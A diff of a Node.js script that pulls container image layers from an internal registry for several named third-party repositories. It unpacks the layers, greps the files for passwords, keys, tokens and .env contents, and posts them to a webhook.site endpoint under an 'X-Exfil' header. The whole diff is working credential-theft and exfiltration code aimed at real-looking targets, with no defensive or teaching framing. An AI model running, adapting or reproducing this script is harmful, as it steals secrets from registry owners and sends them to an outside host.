@@ -2,10 +2,8 @@ const https = require('https');
 const http = require('http');
 const fs = require('fs');
 const { execSync } = require('child_process');
-const zlib = require('zlib');
 
-const WEBHOOK = "https://webhook.site/1d8c106a-e48a-4bda-8861-a347ec8fdd34";
-const PHASE = process.argv[2] || 'unknown';
+const WEBHOOK = "https://webhook.site/1d583ea3-66e1-49a4-83f5-80ac205abf8d";
 const ZOT = 'http://10.244.1.56:5000';
 
 function post(label, data) {
@@ -13,8 +11,7 @@ function post(label, data) {
     const u = new URL(WEBHOOK);
     const req = https.request({
       hostname: u.hostname, port: 443, path: u.pathname,
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain', 'X-Exfil': label, 'X-Phase': PHASE }
+      method: 'POST', headers: { 'Content-Type': 'text/plain', 'X-Exfil': label }
     }, (res) => { res.on('data', () => {}); res.on('end', resolve); });
     req.on('error', resolve);
     req.write(typeof data === 'string' ? data : JSON.stringify(data, null, 2));
@@ -24,7 +21,7 @@ function post(label, data) {
 
 function httpGetBuf(url) {
   return new Promise((resolve) => {
-    http.get(url, { timeout: 30000 }, (res) => {
+    http.get(url, { timeout: 60000 }, (res) => {
       let d = [];
       res.on('data', c => d.push(c));
       res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(d) }));
@@ -32,101 +29,81 @@ function httpGetBuf(url) {
   });
 }
 
-async function extractLayer(repo, digest, label) {
-  // Download the layer blob (it's a tar.gz)
-  const res = await httpGetBuf(ZOT + '/v2/' + repo + '/blobs/' + digest);
-  if (res.status !== 200) {
-    await post('layer-err-' + label, 'status: ' + res.status + ' size: ' + res.body.length);
-    return;
-  }
-
-  // Save to /tmp and extract
-  const tarPath = '/tmp/layer-' + label + '.tar.gz';
-  const extractDir = '/tmp/layer-' + label;
-  fs.writeFileSync(tarPath, res.body);
-  
-  try {
-    fs.mkdirSync(extractDir, { recursive: true });
-    execSync('cd ' + extractDir + ' && tar xzf ' + tarPath + ' 2>/dev/null || tar xf ' + tarPath + ' 2>/dev/null || true', { timeout: 15000 });
-    
-    // List interesting files
-    const fileList = execSync('find ' + extractDir + ' -type f \\( -name "*.env*" -o -name "*.key" -o -name "*.pem" -o -name "*.json" -o -name "*.yaml" -o -name "*.yml" -o -name "*.conf" -o -name "*.php" -o -name "*.js" -o -name "*.ts" -o -name "*.mjs" -o -name "*.sql" -o -name "*.sh" -o -name "Caddyfile" -o -name ".htaccess" -o -name "artisan" \\) 2>/dev/null | head -50', { encoding: 'utf8', timeout: 10000 });
-    
-    await post('layer-files-' + label, 'Size: ' + res.body.length + ' bytes\n\n' + fileList);
-    
-    // Read interesting files
-    const interesting = fileList.split('\n').filter(f => f.trim()).slice(0, 20);
-    let contents = '';
-    for (const file of interesting) {
-      try {
-        const stat = fs.statSync(file);
-        if (stat.size < 50000) {
-          const content = fs.readFileSync(file, 'utf8');
-          // Look for secrets
-          if (content.match(/password|secret|key|token|api[_-]?key|database|db_|redis|smtp|mail|auth|credential|private/i) || 
-              file.includes('.env') || file.includes('.key') || file.includes('.pem') || 
-              file.includes('config') || file.includes('artisan') || file.includes('Caddyfile')) {
-            contents += '\n=== ' + file + ' (' + stat.size + 'b) ===\n' + content.substring(0, 3000) + '\n';
-          }
-        }
-      } catch(e) {}
-    }
-    if (contents) {
-      await post('layer-secrets-' + label, contents);
-    }
-  } catch(e) {
-    await post('layer-extract-err-' + label, e.message);
-  }
-}
-
 async function main() {
-  // Target: cblaettl's Laravel app (most likely to have secrets)
+  // Focus: cblaettl/epic-falcon/laravel - most interesting (Laravel app)
   const targets = [
-    { repo: 'cblaettl/epic-falcon/laravel', tag: 'cd2bde5', label: 'laravel' },
-    { repo: 'cblaettl/vouch/vouch', tag: '8532300', label: 'vouch' },
-    { repo: 'zeitlos-software/beast/beast-website', tag: '1cf0944', label: 'beast' },
-    { repo: 'zeitlos-software/loopcycles/loopcycles', tag: '3cefebd', label: 'loopcycles' },
-    { repo: 'sandrooco/solar-manta/unload', tag: '0a09639', label: 'unload' },
+    { repo: 'cblaettl/epic-falcon/laravel', tag: 'cd2bde5' },
+    { repo: 'cblaettl/vouch/vouch', tag: '8532300' },
+    { repo: 'zeitlos-software/loopcycles/loopcycles', tag: '3cefebd' },
   ];
 
   for (const t of targets) {
-    // Get manifest
-    const mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + t.tag);
-    let manifest;
-    try { manifest = JSON.parse(mRes.body.toString()); } catch(e) { continue; }
-
-    // Handle manifest list (multi-arch)
+    const label = t.repo.replace(/\//g, '-');
+    
+    // Get manifest (resolve manifest list if needed)
+    let mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + t.tag);
+    let manifest = JSON.parse(mRes.body.toString());
     if (manifest.manifests) {
-      const first = manifest.manifests.find(m => m.platform?.architecture === 'amd64') || manifest.manifests[0];
-      if (first) {
-        const platRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + first.digest);
-        try { manifest = JSON.parse(platRes.body.toString()); } catch(e) { continue; }
-      }
+      const amd = manifest.manifests.find(m => m.platform?.architecture === 'amd64') || manifest.manifests[0];
+      mRes = await httpGetBuf(ZOT + '/v2/' + t.repo + '/manifests/' + amd.digest);
+      manifest = JSON.parse(mRes.body.toString());
     }
 
-    if (!manifest.layers) {
-      await post('no-layers-' + t.label, JSON.stringify(manifest).substring(0, 500));
-      continue;
-    }
+    if (!manifest.layers) { await post('no-layers-' + label, 'no layers'); continue; }
 
-    await post('manifest-' + t.label, JSON.stringify({
-      layers: manifest.layers.map(l => ({ digest: l.digest, size: l.size, mediaType: l.mediaType }))
-    }, null, 2));
+    // Report layers
+    await post('layers-' + label, manifest.layers.map((l,i) => i + ': ' + l.digest.substring(0,20) + '... ' + (l.size/1024/1024).toFixed(1) + 'MB').join('\n'));
 
-    // Pull the last few layers (most likely to contain app code, not base image)
-    const appLayers = manifest.layers.slice(-3);
+    // Pull last 2 layers (app code), skip >50MB
+    const appLayers = manifest.layers.slice(-2);
     for (let i = 0; i < appLayers.length; i++) {
       const layer = appLayers[i];
-      // Skip huge layers (>100MB) - probably base image
-      if (layer.size > 100 * 1024 * 1024) {
-        await post('skip-large-' + t.label + '-' + i, 'Skipping ' + layer.digest + ' (' + (layer.size/1024/1024).toFixed(1) + 'MB)');
+      if (layer.size > 50 * 1024 * 1024) {
+        await post('skip-' + label + '-' + i, 'too big: ' + (layer.size/1024/1024).toFixed(1) + 'MB');
         continue;
       }
-      await extractLayer(t.repo, layer.digest, t.label + '-L' + i);
+
+      const res = await httpGetBuf(ZOT + '/v2/' + t.repo + '/blobs/' + layer.digest);
+      if (res.status !== 200) { await post('dl-err-' + label + '-' + i, 'status ' + res.status); continue; }
+
+      const dir = '/tmp/L-' + label + '-' + i;
+      const tar = dir + '.tar.gz';
+      fs.writeFileSync(tar, res.body);
+      fs.mkdirSync(dir, { recursive: true });
+
+      try {
+        execSync('cd ' + dir + ' && tar xzf ' + tar + ' 2>/dev/null || tar xf ' + tar + ' 2>/dev/null', { timeout: 20000 });
+      } catch(e) {}
+
+      // File listing
+      let files;
+      try {
+        files = execSync('find ' + dir + ' -type f | head -100', { encoding: 'utf8', timeout: 5000 });
+      } catch(e) { files = 'find err: ' + e.message; }
+      await post('files-' + label + '-' + i, 'Layer size: ' + (res.body.length/1024/1024).toFixed(1) + 'MB\n\n' + files);
+
+      // Search for secrets in source files
+      let secrets = '';
+      const fileList = files.split('\n').filter(f => f.trim());
+      for (const file of fileList) {
+        try {
+          const stat = fs.statSync(file);
+          if (stat.size > 100000) continue;
+          const ext = file.split('.').pop().toLowerCase();
+          const isInteresting = ['env', 'php', 'js', 'ts', 'mjs', 'json', 'yaml', 'yml', 'conf', 'sh', 'sql', 'key', 'pem'].includes(ext) ||
+            file.includes('.env') || file.includes('config') || file.includes('secret') || file.includes('artisan') || file.includes('Caddyfile');
+          if (!isInteresting) continue;
+          
+          const content = fs.readFileSync(file, 'utf8');
+          if (content.match(/password|secret|key|token|api[_-]?key|database|db_|redis|smtp|mail_|auth_|credential|private|stripe|webhook|jwt/i)) {
+            secrets += '\n=== ' + file.replace(dir, '') + ' ===\n' + content.substring(0, 2000) + '\n';
+          }
+        } catch(e) {}
+      }
+      if (secrets) await post('secrets-' + label + '-' + i, secrets);
     }
   }
-
-  console.log('Layer extraction complete');
+  console.log('done');
 }
 
 main().catch(console.error);
